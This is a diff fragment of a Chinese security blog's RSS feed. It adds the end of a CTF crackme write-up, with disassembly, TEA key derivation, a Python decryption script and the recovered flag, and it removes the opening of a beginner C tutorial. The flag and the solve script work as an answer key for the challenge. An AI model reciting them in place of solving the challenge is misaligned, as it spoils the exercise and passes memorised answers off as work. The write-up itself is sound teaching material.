+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0000000140001681</span> <span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="err">+</span> <span class="mi">0x88</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">0000000140001690</span> <span class="nf">lea</span>     <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x2989</span><span class="p">]</span>    <span class="c1">; cipher array
+</span></span></span><span class="line"><span class="cl"><span class="err">0000000140001697</span> <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rdx</span> <span class="err">+</span> <span class="no">rax</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="na">...</span>
+</span></span><span class="line"><span class="cl"><span class="err">00000001400016</span><span class="nf">c8</span> <span class="no">call</span>    <span class="mi">0x140001440</span>            <span class="c1">; TEA decrypt
+</span></span></span><span class="line"><span class="cl"><span class="na">...</span>
+</span></span><span class="line"><span class="cl"><span class="err">0000000140001713</span> <span class="nf">add</span>     <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="err">+</span> <span class="mi">0x88</span><span class="p">],</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="err">0000000140001727</span> <span class="nf">jb</span>      <span class="mi">0x140001681</span>
+</span></span></code></pre></div><p>解密完成后，程序构造 flag：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">000000014000173</span><span class="nf">b</span> <span class="no">mov</span>     <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="err">+</span> <span class="mi">0x60</span><span class="p">],</span> <span class="mi">5</span>      <span class="c1">; strlen(&#34;flag{&#34;)
+</span></span></span><span class="line"><span class="cl"><span class="err">0000000140001743</span> <span class="nf">mov</span>     <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="err">+</span> <span class="mi">0x58</span><span class="p">],</span> <span class="mi">0x24</span>   <span class="c1">; 36 bytes
+</span></span></span><span class="line"><span class="cl"><span class="na">...</span>
+</span></span><span class="line"><span class="cl"><span class="err">000000014000179</span><span class="nf">c</span> <span class="no">lea</span>     <span class="no">rdx</span><span class="p">,</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x285d</span><span class="p">]</span>            <span class="c1">; &#34;flag{&#34;
+</span></span></span><span class="line"><span class="cl"><span class="na">...</span>
+</span></span><span class="line"><span class="cl"><span class="err">00000001400017</span><span class="nf">f0</span> <span class="no">call</span>    <span class="mi">0x140002c08</span>                    <span class="c1">; copy decrypted 36 bytes
+</span></span></span><span class="line"><span class="cl"><span class="err">0000000140001807</span> <span class="nf">mov</span>     <span class="no">byte</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rax</span><span class="p">],</span> <span class="mi">0x7d</span>            <span class="c1">; append &#39;}&#39;
+</span></span></span></code></pre></div><p>最后用strcmp比较输入和构造出的flag：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0000000140001818</span> <span class="nf">mov</span>     <span class="no">rdx</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="err">+</span> <span class="mi">0x48</span><span class="p">]</span>    <span class="c1">; real flag
+</span></span></span><span class="line"><span class="cl"><span class="err">000000014000181</span><span class="nf">c</span> <span class="no">lea</span>     <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x40</span><span class="p">]</span>              <span class="c1">; user input
+</span></span></span><span class="line"><span class="cl"><span class="err">0000000140001820</span> <span class="nf">mov</span>     <span class="no">rcx</span><span class="p">,</span> <span class="no">rax</span>
+</span></span><span class="line"><span class="cl"><span class="err">0000000140001823</span> <span class="nf">call</span>    <span class="mi">0x140002b50</span>                    <span class="c1">; strcmp
+</span></span></span><span class="line"><span class="cl"><span class="err">0000000140001828</span> <span class="nf">test</span>    <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
+</span></span><span class="line"><span class="cl"><span class="err">000000014000182</span><span class="nf">a</span> <span class="no">jne</span>     <span class="mi">0x14000183d</span>
+</span></span><span class="line"><span class="cl"><span class="err">000000014000182</span><span class="nf">c</span> <span class="no">lea</span>     <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x2878</span><span class="p">]</span>            <span class="c1">; &#34;Correct! well done.&#34;
+</span></span></span></code></pre></div><p>TEA 解密函数地址：0x140001440</p>
+<p>代码如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0000000140001450</span> <span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="err">+</span> <span class="mi">0x10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">0000000140001454</span> <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">0000000140001456</span> <span class="nf">mov</span>     <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">4</span><span class="p">],</span> <span class="no">eax</span>       <span class="c1">; v0
+</span></span></span><span class="line"><span class="cl"><span class="err">0000000140001459</span> <span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="err">+</span> <span class="mi">0x10</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">000000014000145</span><span class="nf">d</span> <span class="no">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rax</span> <span class="err">+</span> <span class="mi">4</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">0000000140001460</span> <span class="nf">mov</span>     <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">8</span><span class="p">],</span> <span class="no">eax</span>       <span class="c1">; v1
+</span></span></span><span class="line"><span class="cl"><span class="err">0000000140001463</span> <span class="nf">mov</span>     <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x14</span><span class="p">],</span> <span class="mi">0x9e3779b9</span>
+</span></span><span class="line"><span class="cl"><span class="err">000000014000146</span><span class="nf">d</span> <span class="no">shl</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">5</span>                         <span class="c1">; delta * 32
+</span></span></span></code></pre></div><p>0x9e3779b9是 TEA 的标准 delta 常量。delta &laquo; 5等价于32轮TEA解密中的初始sum：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">sum = 0x9e3779b9 * 32 mod 2^32 = 0xc6ef3720
+</span></span></code></pre></div><p>循环中先更新 v1，再更新 v0，最后sum -= delta，是标准 TEA 解密结构：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">v1</span> <span class="o">-=</span> <span class="p">((</span><span class="n">v0</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">k</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">^</span> <span class="p">(</span><span class="n">v0</span> <span class="o">+</span> <span class="n">sum</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">v0</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="n">k</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="n">v0</span> <span class="o">-=</span> <span class="p">((</span><span class="n">v1</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">k</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">^</span> <span class="p">(</span><span class="n">v1</span> <span class="o">+</span> <span class="n">sum</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">v1</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="n">k</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="n">sum</span> <span class="o">-=</span> <span class="n">delta</span><span class="p">;</span>
+</span></span></code></pre></div><p>循环次数为32：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">00000001400014</span><span class="nf">ec</span> <span class="no">add</span>     <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x10</span><span class="p">],</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="err">00000001400014</span><span class="nf">f0</span> <span class="no">cmp</span>     <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x10</span><span class="p">],</span> <span class="mi">0x1f</span>
+</span></span><span class="line"><span class="cl"><span class="err">00000001400014</span><span class="nf">f4</span> <span class="no">jle</span>     <span class="mi">0x14000147c</span>
+</span></span></code></pre></div><p>key 派生函数地址：0x140001513</p>
+<p>函数循环处理 4 个 dword。逻辑为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">d</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">((</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">+</span> <span class="n">c</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span></code></pre></div><p>四组常量分别为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">uint32_t</span> <span class="n">a</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x1f2e3d4c</span><span class="p">,</span> <span class="mh">0x0a0b0c0d</span><span class="p">,</span> <span class="mh">0x11223344</span><span class="p">,</span> <span class="mh">0x55667788</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">uint32_t</span> <span class="n">b</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0xaabbccdd</span><span class="p">,</span> <span class="mh">0x99aabbcc</span><span class="p">,</span> <span class="mh">0x33445566</span><span class="p">,</span> <span class="mh">0x77889900</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">uint32_t</span> <span class="n">c</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x01020304</span><span class="p">,</span> <span class="mh">0x05060708</span><span class="p">,</span> <span class="mh">0x09101112</span><span class="p">,</span> <span class="mh">0x13141516</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">uint32_t</span> <span class="n">d</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="mh">0xfeedface</span><span class="p">,</span> <span class="mh">0xabad1dea</span><span class="p">,</span> <span class="mh">0x0badf00d</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></div><p>计算得到 TEA key：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">uint32_t</span> <span class="n">key</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x683a4a7a</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x664a4407</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x80db6ade</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x3daef393</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></div><p>主函数中的密文数组位于：0x140004020</p>
+<p>共10个 dword，也就是5个TEA block：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">uint32_t</span> <span class="n">cipher</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7d7649e3</span><span class="p">,</span> <span class="mh">0x6282c52c</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0xf4fef264</span><span class="p">,</span> <span class="mh">0x55cb8870</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0xa8ae752a</span><span class="p">,</span> <span class="mh">0xa33ad53f</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x1fa37c02</span><span class="p">,</span> <span class="mh">0x6113601c</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x60ef18b4</span><span class="p">,</span> <span class="mh">0xeb31112c</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></div><p>解密后得到40字节数据，但程序只取前36字节拼进flag中间：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">0d3747db-16f6-4c62-9665-b3e7531cefc8
+</span></span></code></pre></div><h4 id="解密脚本">
+<a class="header-anchor" href="#%e8%a7%a3%e5%af%86%e8%84%9a%e6%9c%ac"></a>
+解密脚本
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">MASK</span> <span class="o">=</span> <span class="mh">0xffffffff</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">key_src_a</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x1f2e3d4c</span><span class="p">,</span> <span class="mh">0x0a0b0c0d</span><span class="p">,</span> <span class="mh">0x11223344</span><span class="p">,</span> <span class="mh">0x55667788</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">key_src_b</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0xaabbccdd</span><span class="p">,</span> <span class="mh">0x99aabbcc</span><span class="p">,</span> <span class="mh">0x33445566</span><span class="p">,</span> <span class="mh">0x77889900</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">key_src_c</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x01020304</span><span class="p">,</span> <span class="mh">0x05060708</span><span class="p">,</span> <span class="mh">0x09101112</span><span class="p">,</span> <span class="mh">0x13141516</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">key_src_d</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="mh">0xfeedface</span><span class="p">,</span> <span class="mh">0xabad1dea</span><span class="p">,</span> <span class="mh">0x0badf00d</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cipher</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7d7649e3</span><span class="p">,</span> <span class="mh">0x6282c52c</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0xf4fef264</span><span class="p">,</span> <span class="mh">0x55cb8870</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0xa8ae752a</span><span class="p">,</span> <span class="mh">0xa33ad53f</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x1fa37c02</span><span class="p">,</span> <span class="mh">0x6113601c</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x60ef18b4</span><span class="p">,</span> <span class="mh">0xeb31112c</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">derive_key</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">t</span> <span class="o">=</span> <span class="p">((</span><span class="n">key_src_a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key_src_b</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">+</span> <span class="n">key_src_c</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">&amp;</span> <span class="n">MASK</span>
+</span></span><span class="line"><span class="cl">        <span class="n">key</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">key_src_d</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">t</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">MASK</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">key</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">tea_decrypt_block</span><span class="p">(</span><span class="n">v0</span><span class="p">,</span> <span class="n">v1</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">delta</span> <span class="o">=</span> <span class="mh">0x9e3779b9</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sum_</span> <span class="o">=</span> <span class="p">(</span><span class="n">delta</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">MASK</span>
+</span></span><span class="line"><span class="cl">    <span class="n">k0</span><span class="p">,</span> <span class="n">k1</span><span class="p">,</span> <span class="n">k2</span><span class="p">,</span> <span class="n">k3</span> <span class="o">=</span> <span class="n">key</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="n">v1</span> <span class="o">-</span> <span class="p">((((</span><span class="n">v0</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">MASK</span><span class="p">)</span> <span class="o">+</span> <span class="n">k2</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">v0</span> <span class="o">+</span> <span class="n">sum_</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">MASK</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">v0</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="n">k3</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="n">MASK</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v0</span> <span class="o">=</span> <span class="p">(</span><span class="n">v0</span> <span class="o">-</span> <span class="p">((((</span><span class="n">v1</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">MASK</span><span class="p">)</span> <span class="o">+</span> <span class="n">k0</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">v1</span> <span class="o">+</span> <span class="n">sum_</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">MASK</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">v1</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="n">k1</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="n">MASK</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sum_</span> <span class="o">=</span> <span class="p">(</span><span class="n">sum_</span> <span class="o">-</span> <span class="n">delta</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">MASK</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">v0</span><span class="p">,</span> <span class="n">v1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">derive_key</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">plain</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">cipher</span><span class="p">),</span> <span class="mi">2</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v0</span><span class="p">,</span> <span class="n">v1</span> <span class="o">=</span> <span class="n">tea_decrypt_block</span><span class="p">(</span><span class="n">cipher</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">cipher</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">],</span> <span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">plain</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;II&#34;</span><span class="p">,</span> <span class="n">v0</span><span class="p">,</span> <span class="n">v1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">middle</span> <span class="o">=</span> <span class="n">plain</span><span class="p">[:</span><span class="mi">36</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;flag{&#34;</span> <span class="o">+</span> <span class="n">middle</span> <span class="o">+</span> <span class="s2">&#34;}&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></div><p>运行结果：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">flag{0d3747db-16f6-4c62-9665-b3e7531cefc8}
+</span></span></code></pre></div><h4 id="flag-5">
+<a class="header-anchor" href="#flag-5"></a>
+flag
+</h4><p><code>flag{0d3747db-16f6-4c62-9665-b3e7531cefc8}</code></p>
+
+        
+        <hr><p>本文2026-09-20首发于<a href='https://blog.m15tak3.com/'>M15tak3のBlog</a>，最后修改于2026-09-20</p><p>本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！</p>]]>
+      </description>
+      
+        <category>CTF</category>
+      
+    </item>
     
       
     
@@ -2286,244 +2861,6 @@ Pwn 基础之C/C++（二）：控制流程、函数与作用域
 
         
         <hr><p>本文2026-09-09首发于<a href='https://blog.m15tak3.com/'>M15tak3のBlog</a>，最后修改于2026-09-09</p><p>本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！</p>]]>
-      </description>
-      
-        <category>CTF</category><category>技术</category>
-      
-    </item>
-    
-      
-    
-
-    <item>
-      <title>Pwn 基础之C/C&#43;&#43;（一）：从第一个 C 程序到数据类型</title>
-      <link>https://blog.m15tak3.com/post/01-c-program-types/</link>
-      <pubDate>Tue, 08 Sep 2026 14:00:00 &#43;0800</pubDate>
-      <author>skyman.soul@gmail.com (M15tak3)</author>
-      <guid>https://blog.m15tak3.com/post/01-c-program-types/</guid>
-      <description>
-        <![CDATA[<h1>Pwn 基础之C/C++（一）：从第一个 C 程序到数据类型</h1><p>作者：M15tak3（skyman.soul@gmail.com）</p>
-        
-          <h1 id="pwn-基础之cc一从第一个-c-程序到数据类型">
-<a class="header-anchor" href="#pwn-%e5%9f%ba%e7%a1%80%e4%b9%8bcc%e4%b8%80%e4%bb%8e%e7%ac%ac%e4%b8%80%e4%b8%aa-c-%e7%a8%8b%e5%ba%8f%e5%88%b0%e6%95%b0%e6%8d%ae%e7%b1%bb%e5%9e%8b"></a>
-Pwn 基础之C/C++（一）：从第一个 C 程序到数据类型
-</h1><blockquote>
-<p><strong>本篇目标</strong>：能够编译 C 程序，看懂变量声明，并理解整数、字符和字节之间的关系。</p>
-<p><strong>系列定位</strong>：面向 C/C++ 零基础读者，为后续学习二进制程序打基础；本文不讲漏洞利用。</p>
-<p><strong>预计阅读时间</strong>：15～20 分钟。</p>
-</blockquote>
-<h2 id="1-第一个-c-程序">
-<a class="header-anchor" href="#1-%e7%ac%ac%e4%b8%80%e4%b8%aa-c-%e7%a8%8b%e5%ba%8f"></a>
-1. 第一个 C 程序
-</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hello, world!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>保存为 <code>hello.c</code>，然后编译、运行：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc hello.c -o hello
-</span></span><span class="line"><span class="cl">./hello
-</span></span></code></pre></div><p>其中：</p>
-<ul>
-<li><code>#include &lt;stdio.h&gt;</code> 引入标准输入输出函数的声明；</li>
-<li><code>main</code> 是程序入口；</li>
-<li><code>printf</code> 向标准输出打印内容；</li>
-<li><code>\n</code> 表示换行；</li>
-<li><code>return 0</code> 表示程序正常结束。</li>
-</ul>
-<p>带命令行参数的入口可以写成：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p><code>argc</code> 是参数数量，<code>argv</code> 保存各参数字符串的地址。</p>
-<h2 id="2-变量是什么">
-<a class="header-anchor" href="#2-%e5%8f%98%e9%87%8f%e6%98%af%e4%bb%80%e4%b9%88"></a>
-2. 变量是什么
-</h2><p>变量是一块有名称、有类型的存储空间：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">age</span> <span class="o">=</span> <span class="mi">18</span><span class="p">;</span>
